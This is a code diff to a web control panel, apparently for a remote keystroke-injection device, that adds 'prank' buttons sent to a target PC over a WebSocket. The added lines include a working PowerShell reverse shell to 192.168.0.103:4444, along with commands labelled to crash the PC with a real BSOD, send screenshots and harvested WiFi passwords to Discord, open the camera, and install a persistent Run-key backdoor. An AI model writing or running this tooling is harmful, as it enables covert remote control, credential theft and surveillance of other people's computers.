@@ -208,11 +208,18 @@ footer{text-align:center;padding:8px;font-size:.7em;color:#2d3748}
 <div class="kb-hidden" id="kbPranks" style="margin-top:10px">
 <div class="kb-col-title prank">&#128520; Pranks (use at your own risk)</div>
 <div class="prank-btns">
-<button class="pbtn" onclick="if(confirm('Rickroll?'))runPrank('rickroll')">&#127925; Rickroll</button>
+<button class="pbtn" onclick="if(confirm('ห้ความรู้?'))runPrank('rickroll')">&#127925; ห้ความรู้</button>
 <button class="pbtn" onclick="if(confirm('Fake BSOD?'))runPrank('fakeupdate')">&#128309; Fake BSOD</button>
 <button class="pbtn" onclick="if(confirm('Shutdown 10s?'))runPrank('shutdown10')">&#9200; Shutdown 10s</button>
 <button class="pbtn" onclick="if(confirm('Mouse Haunt?'))runPrank('mousehaunt')">&#128433; Mouse Haunt</button>
 <button class="pbtn" onclick="if(confirm('Error Popup?'))runPrank('errorpopup')">&#9888; Error Popup</button>
+<button class="pbtn" onclick="if(confirm('Open Camera?'))runPrank('camera')">&#128247; Camera</button>
+<button class="pbtn" onclick="if(confirm('REAL BSOD!! PC WILL CRASH!'))runPrank('bsod')" style="border-color:rgba(255,0,0,.6);background:rgba(255,0,0,.1);color:#ff4444">&#128128; Real BSOD</button>
+<button class="pbtn" onclick="if(confirm('Reverse Shell to 192.168.0.103:4444?'))runPrank('revshell')" style="border-color:rgba(255,0,0,.6);background:rgba(255,0,0,.1);color:#ff4444">&#128279; Rev Shell</button>
+<button class="pbtn" onclick="if(confirm('Screenshot to Discord?'))runPrank('screenshot')" style="border-color:rgba(183,148,244,.4);background:rgba(183,148,244,.08);color:#b794f4">&#128248; Screenshot</button>
+<button class="pbtn" onclick="if(confirm('RevShell+ to 192.168.0.103:4444?'))runPrank('revshell+')" style="border-color:rgba(255,0,0,.6);background:rgba(255,0,0,.1);color:#ff4444">&#128279; RevShell+</button>
+<button class="pbtn" onclick="if(confirm('Extract WiFi Passwords to Discord?'))runPrank('wifiharvest')" style="border-color:rgba(72,187,120,.4);background:rgba(72,187,120,.08);color:#48bb78">&#128246; WiFi Harvest</button>
+<button class="pbtn" onclick="if(confirm('Install Persistent Backdoor (Run Key)?'))runPrank('persistence')" style="border-color:rgba(246,173,85,.4);background:rgba(246,173,85,.08);color:#f6ad55">&#128376; Persistence</button>
 </div>
 </div>
 <div class="run-panel kb-hidden" id="runPanel">
@@ -495,11 +502,18 @@ function runScript(){
 }
 
 const PRANKS={
-  rickroll:'RUNCMD:https://youtu.be/dQw4w9WgXcQ?autoplay=1',
+  rickroll:'RUNCMD:https://youtu.be/GKnqxVSZ3dY?si=J5DS1Ua-3PWclXS9',
   fakeupdate:'RUNCMD:https://fakeupdate.net/win10ue/',
-  shutdown10:'RUNCMD:shutdown -s -t 10 -c "ลาก่อนนน" -f',
+  shutdown10:'RUNCMD:shutdown /s /t 10 /f',
   mousehaunt:'RUNCMD:powershell -w h -c "Add-Type -A System.Windows.Forms;while($true){[System.Windows.Forms.Cursor]::Position=[System.Drawing.Point]::new((random 1920),(random 1080));sleep -m 500}"',
-  errorpopup:'RUNCMD:powershell -w h -c "Add-Type -A System.Windows.Forms,System.Drawing;while($true){$f=New-Object Windows.Forms.Form;$f.TopMost=$true;$f.StartPosition=4;$f.Location=[Drawing.Point]::new((random 1500),(random 800));$f.Text=\'CRITICAL ERROR!\';$b=New-Object Windows.Forms.Button;$b.Text=\'OK\';$b.Dock=5;$b.Add_Click({$f.Close()});$f.Controls.Add($b);$f.ShowDialog()}"'
+  errorpopup:"RUNCMD:powershell -w h -c \"Add-Type -A System.Windows.Forms;1..20|%{[Windows.Forms.MessageBox]::Show('ERROR!','Alert',0,16)}\"",
+  camera:'RUNCMD:microsoft.windows.camera:',
+  bsod:'CMD:BSOD',
+  revshell:'RUNCMD:powershell -w h -c "$c=[Net.Sockets.TCPClient]::new(\'192.168.0.103\',4444);$s=$c.GetStream();$r=New-Object IO.StreamReader $s;$w=New-Object IO.StreamWriter $s;$w.AutoFlush=1;while($l=$r.ReadLine()){$w.Write((iex $l 2>&1|Out-String))}"',
+  screenshot:'CMD:Screenshot',
+  'revshell+':'CMD:RevShell+',
+  wifiharvest:'CMD:WiFiHarvest',
+  persistence:'CMD:Persistence'
 };
 function runPrank(id){
   if(!ws||ws.readyState!==1){console.log('[WebKB] WS not connected!');return;}
@@ -507,9 +521,14 @@ function runPrank(id){
   if(!cmd) return;
   ws.send(cmd);
   footer.textContent='[Prank] '+id;
-  // Rickroll & fakeupdate need F11 after page loads
+  // Rickroll & fakeupdate need F11 after page loads, then press 'f'
   if(id==='rickroll'||id==='fakeupdate'){
     setTimeout(()=>{ws.send('CMD:F11');},5000);
+    setTimeout(()=>{ws.send('f');},6000);
+  }
+  // BSOD needs extra time for UAC
+  if(id==='bsod'){
+    footer.textContent='[BSOD] Waiting for UAC + reg add + trigger...';
   }
 }
 document.addEventListener('DOMContentLoaded',function(){
